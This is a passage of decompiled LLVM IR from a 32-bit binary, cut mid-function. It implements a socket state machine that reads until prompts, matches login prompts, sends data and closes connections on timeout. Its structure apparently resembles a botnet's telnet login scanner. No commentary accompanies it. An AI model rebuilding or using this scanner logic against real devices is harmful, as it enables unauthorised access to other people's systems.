  %v2_804aa45 = add i32 %v1_804aa3f, -12
  %v3_804aa45 = inttoptr i32 %v2_804aa45 to i32*
  store i32 %v0_804aa45, i32* %v3_804aa45, align 4
  %v1_804aa46 = add i32 %v1_804aa3f, -16
  %v2_804aa46 = inttoptr i32 %v1_804aa46 to i32*
  store i32 10000, i32* %v2_804aa46, align 4
  %v1_804aa4b = add i32 %v1_804aa3f, -20
  %v2_804aa4b = inttoptr i32 %v1_804aa4b to i32*
  store i32 0, i32* %v2_804aa4b, align 4
  %v1_804aa4d = add i32 %v1_804aa3f, -24
  %v2_804aa4d = inttoptr i32 %v1_804aa4d to i32*
  store i32 1, i32* %v2_804aa4d, align 4
  %v1_804aa4f = add i32 %v1_804aa3f, -28
  %v2_804aa4f = inttoptr i32 %v1_804aa4f to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_8052998.36 to i32), i32* %v2_804aa4f, align 4
  %v0_804aa54 = load i32, i32* %eax.global-to-local, align 4
  %v2_804aa54 = add i32 %v1_804aa3f, -32
  %v3_804aa54 = inttoptr i32 %v2_804aa54 to i32*
  store i32 %v0_804aa54, i32* %v3_804aa54, align 4
  %v0_804aa55 = call i32 @readUntil()
  %v0_804aa5a = load i32, i32* @esp, align 4
  %v1_804aa5d = icmp eq i32 %v0_804aa55, 0
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a9c9, i32* %eax.global-to-local, align 4
  br i1 %v1_804aa5d, label %dec_label_pc_804ab1e, label %dec_label_pc_804aa65

dec_label_pc_804aa65:                             ; preds = %dec_label_pc_804a9f9
  store i32 0, i32* %v1_804a9ce, align 4
  %v1_804aa93 = inttoptr i32 %v1_804aa0a to i16*
  store i16 0, i16* %v1_804aa93, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v1_804aa28, i32* %eax.global-to-local, align 4
  %v2_804aaac = load i32, i32* %v1_804aa2b, align 4
  store i32 %v2_804aaac, i32* %eax.global-to-local, align 4
  %v0_804aaae = load i32, i32* @esp, align 4
  %v1_804aab1 = add i32 %v0_804aaae, -12
  %v2_804aab1 = inttoptr i32 %v1_804aab1 to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_8052998.36 to i32), i32* %v2_804aab1, align 4
  %v0_804aab6 = load i32, i32* %eax.global-to-local, align 4
  %v2_804aab6 = add i32 %v0_804aaae, -16
  %v3_804aab6 = inttoptr i32 %v2_804aab6 to i32*
  store i32 %v0_804aab6, i32* %v3_804aab6, align 4
  %v2_804aab7 = inttoptr i32 %stack_var_-224.264 to i8*
  %v3_804aab7 = call i32 @strstr(i32 %stack_var_-228.262, i8* %v2_804aab7)
  %v1_804aabf = icmp eq i32 %v3_804aab7, 0
  %. = select i1 %v1_804aabf, i8 7, i8 5
  store i8 %., i8* %v4_804a02e, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v1_804aa28, i32* %eax.global-to-local, align 4
  %v2_804ab01 = load i32, i32* %v1_804aa2b, align 4
  store i32 %v2_804ab01, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v0_804ab0a = load i32, i32* @esp, align 4
  %v2_804ab0d = add i32 %v0_804ab0a, -8
  %v3_804ab0d = inttoptr i32 %v2_804ab0d to i32*
  store i32 1024, i32* %v3_804ab0d, align 4
  %v1_804ab0e = add i32 %v0_804ab0a, -12
  %v2_804ab0e = inttoptr i32 %v1_804ab0e to i32*
  store i32 0, i32* %v2_804ab0e, align 4
  %v0_804ab10 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ab10 = add i32 %v0_804ab0a, -16
  %v3_804ab10 = inttoptr i32 %v2_804ab10 to i32*
  store i32 %v0_804ab10, i32* %v3_804ab10, align 4
  %v3_804ab11 = inttoptr i32 %stack_var_-228.262 to i8*
  %v4_804ab11 = call i32 @__GI_memset(i8* %v3_804ab11, i32 %stack_var_-224.264, i32 %.v2_8049ee0)
  store i32 %v4_804ab11, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3cf

dec_label_pc_804ab1e:                             ; preds = %dec_label_pc_804a9f9
  store i32 %v1_804aa28, i32* %eax.global-to-local, align 4
  %v2_804ab32 = load i32, i32* %v1_804aa2b, align 4
  store i32 %v2_804ab32, i32* %eax.global-to-local, align 4
  %v1_804ab37 = add i32 %v0_804aa5a, 20
  %v2_804ab37 = inttoptr i32 %v1_804ab37 to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_80529a1.37 to i32), i32* %v2_804ab37, align 4
  %v0_804ab3c = load i32, i32* %eax.global-to-local, align 4
  %v2_804ab3c = add i32 %v0_804aa5a, 16
  %v3_804ab3c = inttoptr i32 %v2_804ab3c to i32*
  store i32 %v0_804ab3c, i32* %v3_804ab3c, align 4
  %v2_804ab3d = inttoptr i32 %stack_var_-224.264 to i8*
  %v3_804ab3d = call i32 @strstr(i32 %stack_var_-228.262, i8* %v2_804ab3d)
  store i32 %v3_804ab3d, i32* %eax.global-to-local, align 4
  %v1_804ab45 = icmp eq i32 %v3_804ab3d, 0
  br i1 %v1_804ab45, label %dec_label_pc_804ab94, label %dec_label_pc_804ab49

dec_label_pc_804ab49:                             ; preds = %dec_label_pc_804ab1e
  %v0_804ab42 = load i32, i32* @esp, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804ab58 = load i32, i32* %v3_804aa3c, align 8
  store i32 %v4_804ab58, i32* %eax.global-to-local, align 4
  %v3_804ab5e = inttoptr i32 %v0_804ab42 to i32*
  store i32 %v4_804ab58, i32* %v3_804ab5e, align 4
  %v1_804ab5f = call i32 @sclose(i32 %stack_var_-228.262)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804ab8a = add i32 %v2_8049faf, %v2_804a02b
  %v4_804ab8a = inttoptr i32 %v3_804ab8a to i8*
  store i8 0, i8* %v4_804ab8a, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804ab94:                             ; preds = %dec_label_pc_804ab1e
  store i32 %v1_804a14566, i32* %ebx.global-to-local, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v1_804aa28, i32* %eax.global-to-local, align 4
  %v2_804abab = load i32, i32* %v1_804aa2b, align 4
  %v1_804abb8 = and i32 %v2_804abab, -256
  store i32 %v1_804abb8, i32* %eax.global-to-local, align 4
  %v4_804abbb = inttoptr i32 %v2_804abab to i8*
  store i32 %v2_804abab, i32* @edi, align 4
  %v3_804abc1 = call i32 @_strlen(i8* %v4_804abbb)
  %v0_804abcd = load i32, i32* %ebx.global-to-local, align 4
  %v2_804abd3 = mul i32 %v0_804abcd, 24
  %v1_804abd8 = add i32 %v2_804a7de, %v2_804abd3
  %v1_804abdb = trunc i32 %v3_804abc1 to i16
  %v3_804abdb = inttoptr i32 %v1_804abd8 to i16*
  store i16 %v1_804abdb, i16* %v3_804abdb, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v1_804a9cb, i32* %eax.global-to-local, align 4
  %v2_804abf2 = load i32, i32* %v1_804a9ce, align 4
  store i32 %v2_804abf2, i32* %eax.global-to-local, align 4
  %v1_804abf4 = add i32 %v2_804abf2, 30
  store i32 %v1_804abf4, i32* @ebx, align 4
  %v0_804abf7 = load i32, i32* @esp, align 4
  %v1_804abfa = add i32 %v0_804abf7, -16
  %v2_804abfa = inttoptr i32 %v1_804abfa to i32*
  store i32 0, i32* %v2_804abfa, align 4
  %v1_804abfc = inttoptr i32 %v2_804abab to i32*
  %v2_804abfc = call i32 @__GI_time(i32* %v1_804abfc)
  store i32 %v2_804abfc, i32* %eax.global-to-local, align 4
  %v0_804ac04 = load i32, i32* @ebx, align 4
  %v7_804ac04 = icmp ult i32 %v0_804ac04, %v2_804abfc
  %v1_804ac06 = icmp eq i1 %v7_804ac04, false
  br i1 %v1_804ac06, label %dec_label_pc_804b3cf, label %dec_label_pc_804ac0c

dec_label_pc_804ac0c:                             ; preds = %dec_label_pc_804ab94
  %v0_804ac01 = load i32, i32* @esp, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804ac1b = load i32, i32* %v3_804aa3c, align 8
  store i32 %v4_804ac1b, i32* %eax.global-to-local, align 4
  %v3_804ac21 = inttoptr i32 %v0_804ac01 to i32*
  store i32 %v4_804ac1b, i32* %v3_804ac21, align 4
  %v1_804ac22 = call i32 @sclose(i32 %v2_804abab)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804ac4d = add i32 %v2_8049faf, %v2_804a02b
  %v4_804ac4d = inttoptr i32 %v3_804ac4d to i8*
  store i8 1, i8* %v4_804ac4d, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804ac57:                             ; preds = %dec_label_pc_804a01f
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804ac66 = add i32 %v2_804a137, %v2_804a02b
  %v4_804ac66 = inttoptr i32 %v3_804ac66 to i8*
  %v5_804ac66 = load i8, i8* %v4_804ac66, align 1
  %v6_804ac66 = zext i8 %v5_804ac66 to i32
  store i32 %v6_804ac66, i32* %eax.global-to-local, align 4
  %v1_804ac6f = mul nuw nsw i32 %v6_804ac66, 4
  %v2_804ac6f = add nuw nsw i32 %v1_804ac6f, 134566240
  %v3_804ac6f = inttoptr i32 %v2_804ac6f to i32*
  %v4_804ac6f = load i32, i32* %v3_804ac6f, align 4
  %v1_804ac81 = and i32 %v4_804ac6f, -256
  store i32 %v1_804ac81, i32* %eax.global-to-local, align 4
  %v4_804ac84 = inttoptr i32 %v4_804ac6f to i8*
  store i32 %v4_804ac6f, i32* @edi, align 4
  %v3_804ac8a = call i32 @_strlen(i8* %v4_804ac84)
  store i32 %v3_804ac8a, i32* @esi, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v5_804aca2 = load i8, i8* %v4_804ac66, align 1
  %v6_804aca2 = zext i8 %v5_804aca2 to i32
  store i32 %v6_804aca2, i32* %eax.global-to-local, align 4
  %v1_804acab = mul nuw nsw i32 %v6_804aca2, 4
  %v2_804acab = add nuw nsw i32 %v1_804acab, 134566240
  %v3_804acab = inttoptr i32 %v2_804acab to i32*
  %v4_804acab = load i32, i32* %v3_804acab, align 4
  store i32 %v4_804acab, i32* @ebx, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v2_804acc1 = add i32 %v2_804a02b, %v2_8049f6b
  %v3_804acc1 = inttoptr i32 %v2_804acc1 to i32*
  %v4_804acc1 = load i32, i32* %v3_804acc1, align 8
  store i32 %v4_804acc1, i32* %eax.global-to-local, align 4
  %v0_804acc4 = load i32, i32* @esp, align 4
  %v1_804acc4 = add i32 %v0_804acc4, -4
  %v2_804acc4 = inttoptr i32 %v1_804acc4 to i32*
  store i32 16384, i32* %v2_804acc4, align 4
  %v0_804acc9 = load i32, i32* @esi, align 4
  %v2_804acc9 = add i32 %v0_804acc4, -8
  %v3_804acc9 = inttoptr i32 %v2_804acc9 to i32*
  store i32 %v0_804acc9, i32* %v3_804acc9, align 4
  %v0_804acca = load i32, i32* @ebx, align 4
  %v2_804acca = add i32 %v0_804acc4, -12
  %v3_804acca = inttoptr i32 %v2_804acca to i32*
  store i32 %v0_804acca, i32* %v3_804acca, align 4
  %v0_804accb = load i32, i32* %eax.global-to-local, align 4
  %v2_804accb = add i32 %v0_804acc4, -16
  %v3_804accb = inttoptr i32 %v2_804accb to i32*
  store i32 %v0_804accb, i32* %v3_804accb, align 4
  %v4_804accc = call i32 @__libc_send(i32 %v4_804ac6f, i32 %stack_var_-232.260, i32 %stack_var_-228.262, i32 %stack_var_-224.264)
  %v0_804acd1 = load i32, i32* @esp, align 4
  %v2_804acd4 = icmp slt i32 %v4_804accc, 0
  %v1_804acd6 = icmp eq i1 %v2_804acd4, false
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804ad32 = load i32, i32* %v3_804acc1, align 8
  store i32 %v4_804ad32, i32* %eax.global-to-local, align 4
  br i1 %v1_804acd6, label %dec_label_pc_804ad23, label %dec_label_pc_804acd8

dec_label_pc_804acd8:                             ; preds = %dec_label_pc_804ac57
  %v3_804aced = inttoptr i32 %v0_804acd1 to i32*
  store i32 %v4_804ad32, i32* %v3_804aced, align 4
  %v1_804acee = call i32 @sclose(i32 %v4_804ac6f)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804ad19 = add i32 %v2_8049faf, %v2_804a02b
  %v4_804ad19 = inttoptr i32 %v3_804ad19 to i8*
  store i8 1, i8* %v4_804ad19, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804ad23:                             ; preds = %dec_label_pc_804ac57
  %v1_804ad35 = add i32 %v0_804acd1, 12
  %v2_804ad35 = inttoptr i32 %v1_804ad35 to i32*
  store i32 16384, i32* %v2_804ad35, align 4
  %v1_804ad3a = add i32 %v0_804acd1, 8
  %v2_804ad3a = inttoptr i32 %v1_804ad3a to i32*
  store i32 2, i32* %v2_804ad3a, align 4
  %v1_804ad3c = add i32 %v0_804acd1, 4
  %v2_804ad3c = inttoptr i32 %v1_804ad3c to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052995.35 to i32), i32* %v2_804ad3c, align 4
  %v0_804ad41 = load i32, i32* %eax.global-to-local, align 4
  %v3_804ad41 = inttoptr i32 %v0_804acd1 to i32*
  store i32 %v0_804ad41, i32* %v3_804ad41, align 4
  %v4_804ad42 = call i32 @__libc_send(i32 %v4_804ac6f, i32 %stack_var_-232.260, i32 %stack_var_-228.262, i32 %stack_var_-224.264)
  %v0_804ad47 = load i32, i32* @esp, align 4
  %v2_804ad4a = icmp slt i32 %v4_804ad42, 0
  %v1_804ad4c = icmp eq i1 %v2_804ad4a, false
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  br i1 %v1_804ad4c, label %dec_label_pc_804ad99, label %dec_label_pc_804ad4e

dec_label_pc_804ad4e:                             ; preds = %dec_label_pc_804ad23
  %v4_804ad5d = load i32, i32* %v3_804acc1, align 8
  store i32 %v4_804ad5d, i32* %eax.global-to-local, align 4
  %v3_804ad63 = inttoptr i32 %v0_804ad47 to i32*
  store i32 %v4_804ad5d, i32* %v3_804ad63, align 4
  %v1_804ad64 = call i32 @sclose(i32 %v4_804ac6f)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804ad8f = add i32 %v2_8049faf, %v2_804a02b
  %v4_804ad8f = inttoptr i32 %v3_804ad8f to i8*
  store i8 1, i8* %v4_804ad8f, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804ad99:                             ; preds = %dec_label_pc_804ad23
  store i8 6, i8* %v4_804a02e, align 8
  br label %dec_label_pc_804b3cf

dec_label_pc_804adb2:                             ; preds = %dec_label_pc_804a01f
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  %v2_804adc1 = add i32 %v2_804a02b, %v2_8049f6b
  %v1_804adc3 = add i32 %v2_804adc1, 12
  store i32 %v1_804adc3, i32* %eax.global-to-local, align 4
  %v1_804adc6 = inttoptr i32 %v1_804adc3 to i32*
  %v2_804adc6 = load i32, i32* %v1_804adc6, align 4
  store i32 %v2_804adc6, i32* %eax.global-to-local, align 4
  %v1_804adc8 = icmp eq i32 %v2_804adc6, 0
  %v1_804adca = icmp eq i1 %v1_804adc8, false
  br i1 %v1_804adca, label %dec_label_pc_804adf1, label %dec_label_pc_804adcc

dec_label_pc_804adcc:                             ; preds = %dec_label_pc_804adb2
  store i32 %v1_804a14566, i32* @ebx, align 4
  %v0_804adcf = load i32, i32* @esp, align 4
  %v1_804add2 = add i32 %v0_804adcf, -16
  %v2_804add2 = inttoptr i32 %v1_804add2 to i32*
  store i32 0, i32* %v2_804add2, align 4
  %v1_804add4 = inttoptr i32 %v6_804a02e to i32*
  %v2_804add4 = call i32 @__GI_time(i32* %v1_804add4)
  store i32 %v2_8049f6b, i32* %edx.global-to-local, align 4
  %v0_804ade1 = load i32, i32* @ebx, align 4
  %v2_804ade7 = mul i32 %v0_804ade1, 24
  %v2_804adea = add i32 %v2_804ade7, %v2_8049f6b
  %v1_804adec = add i32 %v2_804adea, 12
  store i32 %v1_804adec, i32* %eax.global-to-local, align 4
  %v2_804adef = inttoptr i32 %v1_804adec to i32*
  store i32 %v2_804add4, i32* %v2_804adef, align 4
  br label %dec_label_pc_804adf1

dec_label_pc_804adf1:                             ; preds = %dec_label_pc_804adb2, %dec_label_pc_804adcc
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  %v1_804ae02 = add i32 %v2_804adc1, 16
  store i32 %v1_804ae02, i32* %eax.global-to-local, align 4
  %v1_804ae05 = inttoptr i32 %v1_804ae02 to i32*
  %v2_804ae05 = load i32, i32* %v1_804ae05, align 8
  %v1_804ae09 = urem i32 %v2_804ae05, 65536
  store i32 %v1_804ae09, i32* @esi, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  %v1_804ae20 = add i32 %v2_804adc1, 20
  store i32 %v1_804ae20, i32* %eax.global-to-local, align 4
  %v1_804ae23 = inttoptr i32 %v1_804ae20 to i32*
  %v2_804ae23 = load i32, i32* %v1_804ae23, align 4
  store i32 %v2_804ae23, i32* @ebx, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804ae34 = inttoptr i32 %v2_804adc1 to i32*
  %v4_804ae34 = load i32, i32* %v3_804ae34, align 8
  store i32 %v4_804ae34, i32* %eax.global-to-local, align 4
  %v1_804ae37 = load i32, i32* @esp, align 4
  %v2_804ae37 = add i32 %v1_804ae37, -4
  %v3_804ae37 = inttoptr i32 %v2_804ae37 to i32*
  store i32 %v1_804ae09, i32* %v3_804ae37, align 4
  %v1_804ae38 = add i32 %v1_804ae37, -8
  %v2_804ae38 = inttoptr i32 %v1_804ae38 to i32*
  store i32 1024, i32* %v2_804ae38, align 4
  %v0_804ae3d = load i32, i32* @ebx, align 4
  %v2_804ae3d = add i32 %v1_804ae37, -12
  %v3_804ae3d = inttoptr i32 %v2_804ae3d to i32*
  store i32 %v0_804ae3d, i32* %v3_804ae3d, align 4
  %v1_804ae3e = add i32 %v1_804ae37, -16
  %v2_804ae3e = inttoptr i32 %v1_804ae3e to i32*
  store i32 10000, i32* %v2_804ae3e, align 4
  %v1_804ae43 = add i32 %v1_804ae37, -20
  %v2_804ae43 = inttoptr i32 %v1_804ae43 to i32*
  store i32 0, i32* %v2_804ae43, align 4
  %v1_804ae45 = add i32 %v1_804ae37, -24
  %v2_804ae45 = inttoptr i32 %v1_804ae45 to i32*
  store i32 1, i32* %v2_804ae45, align 4
  %v1_804ae47 = add i32 %v1_804ae37, -28
  %v2_804ae47 = inttoptr i32 %v1_804ae47 to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_80529a1.37 to i32), i32* %v2_804ae47, align 4
  %v0_804ae4c = load i32, i32* %eax.global-to-local, align 4
  %v2_804ae4c = add i32 %v1_804ae37, -32
  %v3_804ae4c = inttoptr i32 %v2_804ae4c to i32*
  store i32 %v0_804ae4c, i32* %v3_804ae4c, align 4
  %v0_804ae4d = call i32 @readUntil()
  store i32 %v0_804ae4d, i32* %eax.global-to-local, align 4
  %v1_804ae55 = icmp eq i32 %v0_804ae4d, 0
  br i1 %v1_804ae55, label %dec_label_pc_804b011, label %dec_label_pc_804ae5d

dec_label_pc_804ae5d:                             ; preds = %dec_label_pc_804adf1
  store i32 0, i32* %v1_804adc6, align 4
  %v1_804ae8b = inttoptr i32 %v1_804ae02 to i16*
  store i16 0, i16* %v1_804ae8b, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v1_804ae20, i32* %eax.global-to-local, align 4
  %v2_804aea4 = load i32, i32* %v1_804ae23, align 4
  store i32 %v2_804aea4, i32* %eax.global-to-local, align 4
  %v0_804aea6 = load i32, i32* @esp, align 4
  %v1_804aea9 = add i32 %v0_804aea6, -12
  %v2_804aea9 = inttoptr i32 %v1_804aea9 to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_80529a1.37 to i32), i32* %v2_804aea9, align 4
  %v0_804aeae = load i32, i32* %eax.global-to-local, align 4
  %v2_804aeae = add i32 %v0_804aea6, -16
  %v3_804aeae = inttoptr i32 %v2_804aeae to i32*
  store i32 %v0_804aeae, i32* %v3_804aeae, align 4
  %v2_804aeaf = inttoptr i32 %stack_var_-232.260 to i8*
  %v3_804aeaf = call i32 @strstr(i32 %stack_var_-236.258, i8* %v2_804aeaf)
  %v0_804aeb4 = load i32, i32* @esp, align 4
  %v1_804aeb7 = icmp eq i32 %v3_804aeaf, 0
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v1_804ae20, i32* %eax.global-to-local, align 4
  %v2_804af46 = load i32, i32* %v1_804ae23, align 4
  store i32 %v2_804af46, i32* %eax.global-to-local, align 4
  br i1 %v1_804aeb7, label %dec_label_pc_804af32, label %dec_label_pc_804aebb

dec_label_pc_804aebb:                             ; preds = %dec_label_pc_804ae5d
  store i32 %v2_804af46, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v2_804aedb = add i32 %v0_804aeb4, 8
  %v3_804aedb = inttoptr i32 %v2_804aedb to i32*
  store i32 1024, i32* %v3_804aedb, align 4
  %v1_804aedc = add i32 %v0_804aeb4, 4
  %v2_804aedc = inttoptr i32 %v1_804aedc to i32*
  store i32 0, i32* %v2_804aedc, align 4
  %v0_804aede = load i32, i32* %edx.global-to-local, align 4
  %v3_804aede = inttoptr i32 %v0_804aeb4 to i32*
  store i32 %v0_804aede, i32* %v3_804aede, align 4
  %v3_804aedf = inttoptr i32 %stack_var_-236.258 to i8*
  %v4_804aedf = call i32 @__GI_memset(i8* %v3_804aedf, i32 %stack_var_-232.260, i32 %stack_var_-228.262)
  %v0_804aee4 = load i32, i32* @esp, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804aef6 = load i32, i32* %v3_804ae34, align 8
  store i32 %v4_804aef6, i32* %eax.global-to-local, align 4
  %v3_804aefc = inttoptr i32 %v0_804aee4 to i32*
  store i32 %v4_804aef6, i32* %v3_804aefc, align 4
  %v1_804aefd = call i32 @sclose(i32 %stack_var_-236.258)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804af28 = add i32 %v2_8049faf, %v2_804a02b
  %v4_804af28 = inttoptr i32 %v3_804af28 to i8*
  store i8 0, i8* %v4_804af28, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804af32:                             ; preds = %dec_label_pc_804ae5d
  %v2_804af48 = add i32 %v0_804aeb4, 12
  %v3_804af48 = inttoptr i32 %v2_804af48 to i32*
  store i32 %v2_804af46, i32* %v3_804af48, align 4
  %v1_804af49 = inttoptr i32 %stack_var_-236.258 to i8*
  %v2_804af49 = call i32 @matchPrompt(i8* %v1_804af49)
  %v0_804af4e = load i32, i32* @esp, align 4
  %v1_804af51 = icmp eq i32 %v2_804af49, 0
  %v1_804af53 = icmp eq i1 %v1_804af51, false
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  br i1 %v1_804af53, label %dec_label_pc_804afcc, label %dec_label_pc_804af55

dec_label_pc_804af55:                             ; preds = %dec_label_pc_804af32
  store i32 %v1_804ae20, i32* %eax.global-to-local, align 4
  %v2_804af69 = load i32, i32* %v1_804ae23, align 4
  store i32 %v2_804af69, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v2_804af75 = add i32 %v0_804af4e, -4
  %v3_804af75 = inttoptr i32 %v2_804af75 to i32*
  store i32 1024, i32* %v3_804af75, align 4
  %v1_804af76 = add i32 %v0_804af4e, -8
  %v2_804af76 = inttoptr i32 %v1_804af76 to i32*
  store i32 0, i32* %v2_804af76, align 4
  %v0_804af78 = load i32, i32* %edx.global-to-local, align 4
  %v2_804af78 = add i32 %v0_804af4e, -12
  %v3_804af78 = inttoptr i32 %v2_804af78 to i32*
  store i32 %v0_804af78, i32* %v3_804af78, align 4
  %v4_804af79 = call i32 @__GI_memset(i8* %v1_804af49, i32 %stack_var_-232.260, i32 %stack_var_-228.262)
  %v0_804af7e = load i32, i32* @esp, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804af90 = load i32, i32* %v3_804ae34, align 8
  store i32 %v4_804af90, i32* %eax.global-to-local, align 4
  %v3_804af96 = inttoptr i32 %v0_804af7e to i32*
  store i32 %v4_804af90, i32* %v3_804af96, align 4
  %v1_804af97 = call i32 @sclose(i32 %stack_var_-236.258)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804afc2 = add i32 %v2_8049faf, %v2_804a02b
  %v4_804afc2 = inttoptr i32 %v3_804afc2 to i8*
  store i8 1, i8* %v4_804afc2, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804afcc:                             ; preds = %dec_label_pc_804af32
  store i8 7, i8* %v4_804a02e, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v1_804ae20, i32* %eax.global-to-local, align 4
  %v2_804aff4 = load i32, i32* %v1_804ae23, align 4
  store i32 %v2_804aff4, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v0_804affd = load i32, i32* @esp, align 4
  %v2_804b000 = add i32 %v0_804affd, -8
  %v3_804b000 = inttoptr i32 %v2_804b000 to i32*
  store i32 1024, i32* %v3_804b000, align 4
  %v1_804b001 = add i32 %v0_804affd, -12
  %v2_804b001 = inttoptr i32 %v1_804b001 to i32*
  store i32 0, i32* %v2_804b001, align 4
  %v0_804b003 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b003 = add i32 %v0_804affd, -16
  %v3_804b003 = inttoptr i32 %v2_804b003 to i32*
  store i32 %v0_804b003, i32* %v3_804b003, align 4
  %v4_804b004 = call i32 @__GI_memset(i8* %v1_804af49, i32 %stack_var_-232.260, i32 %stack_var_-228.262)
  store i32 %v4_804b004, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3cf

dec_label_pc_804b011:                             ; preds = %dec_label_pc_804adf1
  store i32 %v1_804a14566, i32* %ebx.global-to-local, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v1_804ae20, i32* %eax.global-to-local, align 4
  %v2_804b028 = load i32, i32* %v1_804ae23, align 4
  %v1_804b035 = and i32 %v2_804b028, -256
  store i32 %v1_804b035, i32* %eax.global-to-local, align 4
  %v4_804b038 = inttoptr i32 %v2_804b028 to i8*
  store i32 %v2_804b028, i32* @edi, align 4
  %v3_804b03e = call i32 @_strlen(i8* %v4_804b038)
  %v0_804b04a = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b050 = mul i32 %v0_804b04a, 24
  %v1_804b055 = add i32 %v2_804a7de, %v2_804b050
  %v1_804b058 = trunc i32 %v3_804b03e to i16
  %v3_804b058 = inttoptr i32 %v1_804b055 to i16*
  store i16 %v1_804b058, i16* %v3_804b058, align 8
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v1_804adc3, i32* %eax.global-to-local, align 4
  %v2_804b06f = load i32, i32* %v1_804adc6, align 4
  store i32 %v2_804b06f, i32* %eax.global-to-local, align 4
  %v1_804b071 = add i32 %v2_804b06f, 30
  store i32 %v1_804b071, i32* @ebx, align 4
  %v0_804b074 = load i32, i32* @esp, align 4
  %v1_804b077 = add i32 %v0_804b074, -16
  %v2_804b077 = inttoptr i32 %v1_804b077 to i32*
  store i32 0, i32* %v2_804b077, align 4
  %v1_804b079 = inttoptr i32 %v2_804b028 to i32*
  %v2_804b079 = call i32 @__GI_time(i32* %v1_804b079)
  store i32 %v2_804b079, i32* %eax.global-to-local, align 4
  %v0_804b081 = load i32, i32* @ebx, align 4
  %v7_804b081 = icmp ult i32 %v0_804b081, %v2_804b079
  %v1_804b083 = icmp eq i1 %v7_804b081, false
  br i1 %v1_804b083, label %dec_label_pc_804b3cf, label %dec_label_pc_804b089

dec_label_pc_804b089:                             ; preds = %dec_label_pc_804b011
  %v0_804b07e = load i32, i32* @esp, align 4
  store i32 %v1_804a14566, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804b098 = load i32, i32* %v3_804ae34, align 8
  store i32 %v4_804b098, i32* %eax.global-to-local, align 4
  %v3_804b09e = inttoptr i32 %v0_804b07e to i32*
